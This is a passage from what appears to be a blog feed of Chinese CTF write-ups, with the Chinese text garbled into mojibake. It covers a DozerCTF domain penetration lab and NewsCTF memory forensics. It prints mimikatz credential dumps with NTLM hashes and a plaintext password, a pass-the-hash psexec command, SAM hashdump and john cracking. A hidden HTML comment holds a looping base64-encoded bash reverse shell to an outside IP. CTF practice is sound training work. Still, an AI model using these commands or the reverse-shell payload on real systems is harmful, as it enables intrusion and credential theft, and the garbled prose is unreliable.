   msv :         [00000003] Primary         * Username : wordpress         * Domain   : WEB02         * NTLM     : b86fad0edf04a96244ec22959ce47d1d         * SHA1     : f11df01e661b9f3da0736a850b82d6d5c3b65529         [00010000] CredentialKeys         * NTLM     : 85e6f9a1053b80f86820e4deaa351968         * SHA1     : f37f6af8dc2cfd74a967181db0376dc5d1197fb1         [00010000] CredentialKeys         * NTLM     : b86fad0edf04a96244ec22959ce47d1d         * SHA1     : f11df01e661b9f3da0736a850b82d6d5c3b65529        tspkg :        wdigest :         * Username : wordpress         * Domain   : WEB02         * Password : Dozer@p4ssw0rd        kerberos :         * Username : wordpress         * Domain   : WEB02         * Password : (null)        ssp :        credman :</code></pre><p><code>DOZER\WEB02$</code> ç”¨æˆ·è¯´ä¸å®šæœ‰æˆï¼Œå¯†ç å’Œ NTLM éƒ½æœ‰äº†ã€‚</p><p>ç„¶è€Œå‘ç°åˆ©ç”¨å®ƒå¹¶ä¸èƒ½ç™»ä¸ŠåŸŸæ§ 10.10.1.1 å•Šï¼</p><p>çœ‹äº†çœ‹ Administrators ç”¨æˆ·ç»„ï¼Œåº”è¯¥åŸŸç®¡æ˜¯è¿™ä¸ªæ‰å¯¹å§ï¼Œç„¶è€Œå†…å­˜é‡Œä¹Ÿæ²¡æœ‰åŸŸç®¡çš„ hash å•Šâ€¦â€¦</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210606041042408.png"></p><p>æ€•æ˜¯ç¯å¢ƒå·²ç»è¢«ä¹‹å‰è¿›æ¥çš„å¸ˆå‚…ä»¬æ…ä¹±äº†ã€‚<em>ï¼ˆæ‘Šæ‰‹</em></p><p>ä¹ˆå¾—åŠæ³•ï¼Œåˆè€ƒè™‘åˆ°å¤§å¸ˆå‚…è¯´åŸŸæ§å°±æœ‰ MS17-010 è¿™ä¸ªæ´ï¼Œè¿™é‡Œå°±è¯•ç€æ‰“ä¸€æ‰“å§ã€‚è™½ç„¶è¯´æ˜¯è¿™æ ·éé¢„æœŸè§£â€¦â€¦</p><p>åœ¨ä¹‹å‰çš„æœºå™¨ä¼ äº†ä¸ª fscan ä¸Šå»å†æ‰«ä¸€æ³¢å†…ç½‘ï¼Œé¡ºä¾¿ç”¨ç®¡ç†å‘˜èº«ä»½æ‰«ä¸€æ³¢ ms17010.</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210603064921187.png"></p><p>å¥½å®¶ä¼™ï¼Œä»–åŸŸæ§æœç„¶æœ‰æ´å•Šï¼</p><p><em>ï¼ˆè¿™é‡Œå¤ç°çš„æ—¶å€™å‘ç°åˆæ‰“ä¸é€šäº†ï¼Œç›´æ¥ç•¥å»ä¸å†™äº†å§</em></p><p>ç„¶ååˆ©ç”¨ <strong><a href="https://github.com/SecureAuthCorp/impacket">impacket</a></strong> å·¥å…·ä¸­çš„ psexec.pyï¼Œå¯ä»¥é€šè¿‡ hash æ¥è¿æ¥è¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€‚</p><blockquote><p>å¯ä»¥å‚è€ƒ <a href="https://www.freebuf.com/sectool/175208.html">Impacket ç½‘ç»œåè®®å·¥å…·åŒ…ä»‹ç»</a></p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash">psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9912e73b8ee265638b43d105fdb4c6f4 dozer/Administrator@10.10.1.1</code></pre><p>ä¹±ç çš„è¯å…ˆæŒ‡å®šä¸€ä¸‹ç¼–ç  <code>chcp 65001</code>ï¼Œä½¿ç”¨ UTF-8 ç¼–ç ã€‚</p><p>åœ¨æ¡Œé¢ä¸Šæ‹¿åˆ° flagã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210606033315877.png" alt="flag"></p><p>mimikatz æŠ“å–å¯†ç ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz.exe <span class="token string">"privilege::debug"</span> <span class="token string">"sekurlsa::logonpasswords full"</span> <span class="token builtin class-name">exit</span></code></pre><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210606034138661.png"></p><p>å¾—åˆ° Administrator æ˜æ–‡å¯†ç  <code>Admin890...</code></p><p>åŒæ—¶ä¹Ÿå‘ç°äº†ä¸ª flag ç”¨æˆ·ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210606034448247.png"></p><h2 id="0x07-10-10-1-100-Exchange"><a href="#0x07-10-10-1-100-Exchange" class="headerlink" title="0x07 10.10.1.100 Exchange"></a>0x07 10.10.1.100 Exchange</h2><p>åˆ©ç”¨<code>DOZER\WEB02$</code> ç”¨æˆ·ä¿¡æ¯é€šè¿‡ ADExplorer64 è¿æ¥åˆ°åŸŸæ§ 10.10.1.1ï¼Œå¯ä»¥æŸ¥çœ‹ä¸€ä¸‹åŸŸå†…ä¿¡æ¯ã€‚</p><p>é‡Œé¢çœ‹åˆ°äº†ä¸ª flag ç”¨æˆ·ã€‚</p><p>ï¼ˆå®é™…ä¸ŠåŸŸå†…çš„ç”¨æˆ·éƒ½èƒ½è¿æ¥åŸŸæ§ï¼ŒæŸ¥çœ‹åŸŸå†…çš„ä¿¡æ¯â€¦â€¦ä¹‹å‰çš„ Alice ä¹Ÿå¯ä»¥ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210606033141453.png"></p><p>ç”¨åŸŸç®¡çš„ Administrator ç™»å½• <a href="https://10.10.1.100/owa/">https://10.10.1.100/owa/</a></p><p>é‡Œé¢æœ‰ä¸ªè‰ç¨¿æç¤ºäº† flag éœ€è¦åœ¨ Dozerflagflagï¼ˆä¹Ÿå°±æ˜¯ <a href="mailto:flag@dozer.org">flag@dozer.org</a> ï¼‰ç”¨æˆ·é‡Œæ‰¾ã€‚å’Œä¸Šé¢çš„å‘ç°ç›¸ç…§åº”äº†ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210606031200232.png"></p><p>æŒ‰ç…§å®˜æ–¹ writeup é‡Œçš„è¯´æ³•ï¼Œé¦–å…ˆåˆ©ç”¨åŸŸç®¡ Administrator ç™»å½• Exchange ç®¡ç†ä¸­å¿ƒï¼Œå³ <a href="https://10.10.1.100/ecp/">https://10.10.1.100/ecp/</a></p><p>ç„¶åç»™ flag ç”¨æˆ·è®¾ç½®é‚®ç®±å§”æ‰˜ï¼ŒæŠŠ Administrator ç”¨æˆ·åŠ è¿›å»ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210606032119885.png"></p><p>ç„¶åè®¿é—® <code>https://10.10.1.100/owa/flag@dozer.org/</code> å³å¯æŸ¥çœ‹ flag ç”¨æˆ·çš„é‚®ä»¶ï¼Œä»è€Œæ‹¿åˆ° flagã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210606031543911.png"></p><h2 id="0x08-å°ç»“"><a href="#0x08-å°ç»“" class="headerlink" title="0x08 å°ç»“"></a>0x08 å°ç»“</h2><p>ç¬¬ä¸€æ¬¡æ‰“åŸŸæ¸—é€çš„é¢˜ç›®ï¼Œå¥½çˆ½å•Šï¼</p><p>æ„Ÿè°¢ä¸»åŠæ–¹æ­å»ºçš„åŸŸç¯å¢ƒï¼Œè®©å–µå–µæœ‰æœºä¼šå¥½å¥½ç©äº†ä¸€æ³¢ï¼</p><p>æ˜å¹´æœ‰æœºä¼šå†æ¥ç© qwqï¼</p><p><em>ï¼ˆæºœäº†æºœäº†å–µ</em></p><!--<pre class="language-none"><code class="language-none">1&#x3D;system(&#39;while true; do (echo  YmFzaCAtaT4mIC9kZXYvdGNwLzQ3Ljk2LjE2NC4xNTQvNjIzMzQgMD4mMQ&#x3D;&#x3D; | base64 -d |bash); sleep 10; done;&#39;);&amp;file&#x3D;.&#x2F;upload&#x2F;image&#x2F;202105&#x2F;iAWvVAZTHl35fVW29B5zk6iLh6G7K5tDQXL0PaX9.gif</code></pre><p>â€“&gt;</p>-->]]></content>
      
      
      <categories>
          
          <category> Penetration </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Penetration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 NewsCTF 6.1èŒæ–°èµ› WriteUp</title>
      <link href="2021/06/18/CTF_2021NewsCTF0601/"/>
      <url>2021/06/18/CTF_2021NewsCTF0601/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/06/18/CTF_2021NewsCTF0601/logo.png"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><blockquote><p><strong>NEWSCTF 2021.6.1èŒæ–°èµ›</strong></p><p>æ¯”èµ›æ—¶é—´ï¼š2021.5.31 08:00 - 6.3 00:00</p><p><a href="http://114.96.78.89:8000/">http://114.96.78.89:8000/</a></p><p>å”¯ä¸€å®˜æ–¹QQç¾¤ï¼š1063624041</p></blockquote><p>å…­ä¸€é‚£å‡ å¤©æœ‰ä¸ªå°æ¯”èµ›ï¼Œä¸è¿‡å‰æ®µæ—¶é—´æ¯”è¾ƒå¿™æ²¡åšå‡ ä¸ªé¢˜ï¼Œä¹Ÿæ²¡ç©ºæ•´ç†ã€‚</p><p>æ¯”èµ›ç»“æŸåæœ¬æ¥è¿˜æƒ³å¤ç°å‡ ä¸ªé¢˜çš„ï¼Œå’•ç€å’•ç€å‘ç°éƒ½å¿˜è®°äº†ï¼Œè¿™é‡Œå°±æŠŠå‡ ä¸ªç®€å•é¢˜å‘ä¸€å‘å¥½äº†å§ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="very-ez-dump"><a href="#very-ez-dump" class="headerlink" title="very-ez-dump"></a>very-ez-dump</h3><blockquote><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1mqJsQN1kfNFwV0lpGiOBpg">https://pan.baidu.com/s/1mqJsQN1kfNFwV0lpGiOBpg</a> æå–ç ï¼šnews </p><p>ï¼ˆæˆ–å»å®˜æ–¹æ¯”èµ›ç¾¤1063624041çš„ç¾¤æ–‡ä»¶-ä¸´æ—¶é¢˜ç›®æ–‡ä»¶å¤¹ä¸­è·å–ï¼‰</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># volatility -f mem.raw --profile Win7SP1x64 filescan | grep Desktop</span>Volatility Foundation Volatility Framework <span class="token number">2.6</span>0x000000003dca8280      <span class="token number">4</span>      <span class="token number">0</span> R--r-d <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>DumpIt.exe0x000000003dcc8600      <span class="token number">2</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>Links<span class="token punctuation">\</span>Desktop.lnk0x000000003de778f0      <span class="token number">2</span>      <span class="token number">1</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Public<span class="token punctuation">\</span>Desktop0x000000003dfdcd20      <span class="token number">2</span>      <span class="token number">1</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>Desktop0x000000003e0e9f20      <span class="token number">1</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SendTo<span class="token punctuation">\</span>Desktop.ini0x000000003e156f20     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>desktop.ini0x000000003e15aac0      <span class="token number">2</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Public<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>desktop.ini0x000000003e16c250     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>Desktop.ini0x000000003e16e070     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>Desktop.ini0x000000003e16ff20     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Maintenance<span class="token punctuation">\</span>Desktop.ini0x000000003e170f20     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>Accessibility<span class="token punctuation">\</span>Desktop.ini0x000000003e171f20     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>System Tools<span class="token punctuation">\</span>Desktop.ini0x000000003e172d00     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Games<span class="token punctuation">\</span>Desktop.ini0x000000003e174e20     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Maintenance<span class="token punctuation">\</span>Desktop.ini0x000000003e175af0     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>System Tools<span class="token punctuation">\</span>Desktop.ini0x000000003e176890     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>Accessibility<span class="token punctuation">\</span>Desktop.ini0x000000003e50cd10     <span class="token number">16</span>      <span class="token number">0</span> RW-rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>è®¡ç®—æœº - å¿«æ·æ–¹å¼.lnk0x000000003f6bf330      <span class="token number">2</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>Remote Desktop Connection.lnk0x000000003fa20e20      <span class="token number">1</span>      <span class="token number">1</span> R--rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>Desktop0x000000003fa4b450     <span class="token number">16</span>      <span class="token number">0</span> RW-r-- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>hint.txt0x000000003fa557f0      <span class="token number">1</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>assembly<span class="token punctuation">\</span>Desktop.ini0x000000003fa62c60      <span class="token number">1</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Media<span class="token punctuation">\</span>Desktop.ini0x000000003fa63200      <span class="token number">2</span>      <span class="token number">1</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>Desktop0x000000003fa77920      <span class="token number">2</span>      <span class="token number">1</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Public<span class="token punctuation">\</span>Desktop0x000000003fabec90      <span class="token number">1</span>      <span class="token number">1</span> RW-rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>WIN-DLV72BHQ4GL-20210520-130833.raw0x000000003faf9f20      <span class="token number">6</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>DumpIt.exe<span class="token comment"># volatility -f mem.raw --profile Win7SP1x64 dumpfiles -Q 0x000000003fa4b450 -D . -u</span>Volatility Foundation Volatility Framework <span class="token number">2.6</span>DataSectionObject 0x3fa4b450   None   <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>hint.txt</code></pre><p>æ¡Œé¢ä¸Šæœ‰ä¸ª <code>hint.txt</code>ï¼Œæå–å‡ºæ¥ã€‚</p><p><img src="/2021/06/18/CTF_2021NewsCTF0601/image-20210602164058269.png"></p><p>å†…å®¹æ˜¯</p><pre class="language-none"><code class="language-none">you ask me where is the passwd?you can try to find the user passwd.it is so ez!!!!!! </code></pre><p>é‚£å°±æŸ¥çœ‹å†…å­˜ï¼Œæå–å¯†ç ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># volatility -f mem.raw --profile Win7SP1x64 hivelist                                            </span>Volatility Foundation Volatility Framework <span class="token number">2.6</span>Virtual            Physical           Name------------------ ------------------ ----0xfffff8a001108010 0x000000001e9f0010 <span class="token punctuation">\</span>??<span class="token punctuation">\</span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>ServiceProfiles<span class="token punctuation">\</span>LocalService<span class="token punctuation">\</span>NTUSER.DAT0xfffff8a001283010 0x000000003d0fa010 <span class="token punctuation">\</span>??<span class="token punctuation">\</span>C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>ntuser.dat0xfffff8a00141b010 0x0000000034bea010 <span class="token punctuation">\</span>??<span class="token punctuation">\</span>C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>UsrClass.dat0xfffff8a0020bb010 0x000000002482d010 <span class="token punctuation">\</span>??<span class="token punctuation">\</span>C:<span class="token punctuation">\</span>System Volume Information<span class="token punctuation">\</span>Syscache.hve0xfffff8a00000f010 0x00000000208a1010 <span class="token punctuation">[</span>no name<span class="token punctuation">]</span>0xfffff8a000024010 0x00000000209ac010 <span class="token punctuation">\</span>REGISTRY<span class="token punctuation">\</span>MACHINE<span class="token punctuation">\</span>SYSTEM0xfffff8a000053010 0x000000001fddb010 <span class="token punctuation">\</span>REGISTRY<span class="token punctuation">\</span>MACHINE<span class="token punctuation">\</span>HARDWARE0xfffff8a0000f6010 0x000000001a98f010 <span class="token punctuation">\</span>SystemRoot<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>Config<span class="token punctuation">\</span>DEFAULT0xfffff8a0005fd010 0x0000000022eb3010 <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Boot<span class="token punctuation">\</span>BCD0xfffff8a0009f5010 0x00000000227ca010 <span class="token punctuation">\</span>SystemRoot<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>Config<span class="token punctuation">\</span>SOFTWARE0xfffff8a000f2b010 0x000000001f3c2010 <span class="token punctuation">\</span>SystemRoot<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>Config<span class="token punctuation">\</span>SECURITY0xfffff8a000fc1010 0x0000000000b5a010 <span class="token punctuation">\</span>SystemRoot<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>Config<span class="token punctuation">\</span>SAM0xfffff8a00107e010 0x00000000055cd010 <span class="token punctuation">\</span>??<span class="token punctuation">\</span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>ServiceProfiles<span class="token punctuation">\</span>NetworkService<span class="token punctuation">\</span>NTUSER.DAT<span class="token comment"># volatility -f mem.raw --profile Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000fc1010</span>Volatility Foundation Volatility Framework <span class="token number">2.6</span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:1507e24d634a54c0b14750a7da2bdfdb:::Guest:501:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::mumuzi:1000:aad3b435b51404eeaad3b435b51404ee:0606ac59df4a10d3a9e1f97b3612546f:::<span class="token comment"># volatility -f mem.raw --profile Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000fc1010 &gt; pass.txt</span>Volatility Foundation Volatility Framework <span class="token number">2.6</span><span class="token comment"># john pass.txt --format=NT</span>Using default input encoding: UTF-8Loaded <span class="token number">3</span> password hashes with no different salts <span class="token punctuation">(</span>NT <span class="token punctuation">[</span>MD4 <span class="token number">256</span>/256 AVX2 8x3<span class="token punctuation">]</span><span class="token punctuation">)</span>Warning: no OpenMP support <span class="token keyword">for</span> this <span class="token builtin class-name">hash</span> type, consider --fork<span class="token operator">=</span><span class="token number">2</span>Proceeding with single, rules:SinglePress <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> statusWarning: Only <span class="token number">11</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">24</span> needed <span class="token keyword">for</span> performance.Warning: Only <span class="token number">23</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">24</span> needed <span class="token keyword">for</span> performance.Almost done: Processing the remaining buffered candidate passwords, <span class="token keyword">if</span> any.Warning: Only <span class="token number">12</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">24</span> needed <span class="token keyword">for</span> performance.Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist<span class="token number">123456789</span>        <span class="token punctuation">(</span>Guest<span class="token punctuation">)</span>Proceeding with incremental:ASCII<span class="token punctuation">..</span>.</code></pre><p>è²Œä¼¼æ²¡å•¥ç”¨â€¦â€¦</p><p>çœ‹çœ‹å‘½ä»¤è¡Œè®°å½•ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># volatility -f mem.raw --profile Win7SP1x64 cmdscan                                                        </span>Volatility Foundation Volatility Framework <span class="token number">2.6</span>**************************************************CommandProcess: conhost.exe Pid: <span class="token number">1588</span>CommandHistory: 0x117120 Application: cmd.exe Flags: Allocated, ResetCommandCount: <span class="token number">13</span> LastAdded: <span class="token number">12</span> LastDisplayed: <span class="token number">12</span>FirstCommand: <span class="token number">0</span> CommandCountMax: <span class="token number">50</span>ProcessHandle: 0x60Cmd <span class="token comment">#0 @ 0x109cf0: dir</span>Cmd <span class="token comment">#1 @ 0x108290: ipconfig</span>Cmd <span class="token comment">#2 @ 0xf8bd0: ipconfig 192.168.26.2</span>Cmd <span class="token comment">#3 @ 0x116aa0: ping newsctf.top</span>Cmd <span class="token comment">#4 @ 0x1082d0: network</span>Cmd <span class="token comment">#5 @ 0x1082f0: net user</span>Cmd <span class="token comment">#6 @ 0xf8c50: net user Guest 123456789</span>Cmd <span class="token comment">#7 @ 0xf8c90: net user mumuzi (ljmmz)ovo</span>Cmd <span class="token comment">#8 @ 0x108350: clear</span>Cmd <span class="token comment">#9 @ 0x116a40: if_you_see_it,</span>Cmd <span class="token comment">#10 @ 0xf8cd0: you_will_find_the_flag</span>Cmd <span class="token comment">#11 @ 0x116ad0: where_is_the_flag?</span>Cmd <span class="token comment">#12 @ 0x1178d0: net user Administrator flag_not_here</span>Cmd <span class="token comment">#29 @ 0x90158: </span>Cmd <span class="token comment">#30 @ 0x10f920: </span>**************************************************CommandProcess: conhost.exe Pid: <span class="token number">2824</span>CommandHistory: 0x357140 Application: DumpIt.exe Flags: AllocatedCommandCount: <span class="token number">0</span> LastAdded: -1 LastDisplayed: -1FirstCommand: <span class="token number">0</span> CommandCountMax: <span class="token number">50</span>ProcessHandle: 0x60Cmd <span class="token comment">#29 @ 0x2d0158: 5</span>Cmd <span class="token comment">#30 @ 0x34f940: 4</span></code></pre><p>å½“æˆ flag äº¤ä¸Šå»éƒ½ä¸å¯¹ã€‚ä¸ä¿¡äº†ã€‚</p><p>å†å»æœä¸€æ³¢æ–‡ä»¶ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># volatility -f mem.raw --profile Win7SP1x64 filescan |grep "flag"               </span>Volatility Foundation Volatility Framework <span class="token number">2.6</span>0x000000003e4b2070      <span class="token number">2</span>      <span class="token number">0</span> -W-rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>galf<span class="token punctuation">\</span>fl^ag.zipesktop<span class="token punctuation">\</span>fl^ag.zipp<span class="token punctuation">\</span>vmware-mumuzi<span class="token punctuation">\</span>VMwareDnD<span class="token punctuation">\</span>9451fe4f<span class="token punctuation">\</span>flag.zip0x000000003fa56dd0      <span class="token number">2</span>      <span class="token number">0</span> RW-rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>mumuzi<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Recent<span class="token punctuation">\</span>flag.lnk<span class="token comment"># volatility -f mem.raw --profile Win7SP1x64 dumpfiles -Q 0x000000003e4b2070 -D . -u                     </span>Volatility Foundation Volatility Framework <span class="token number">2.6</span>DataSectionObject 0x3e4b2070   None   <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>galf<span class="token punctuation">\</span>fl^ag.zipesktop<span class="token punctuation">\</span>fl^ag.zipp<span class="token punctuation">\</span>vmware-mumuzi<span class="token punctuation">\</span>VMwareDnD<span class="token punctuation">\</span>9451fe4f<span class="token punctuation">\</span>flag.zip</code></pre><p><img src="/2021/06/18/CTF_2021NewsCTF0601/image-20210602170702052.png"></p><p>ç”¨ <code>(ljmmz)ovo</code> ä½œä¸ºå¯†ç 